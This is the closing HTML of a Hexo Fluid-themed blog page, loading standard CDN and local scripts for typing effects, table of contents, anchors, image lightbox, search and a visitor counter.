<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/diy_js/typing-effect.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
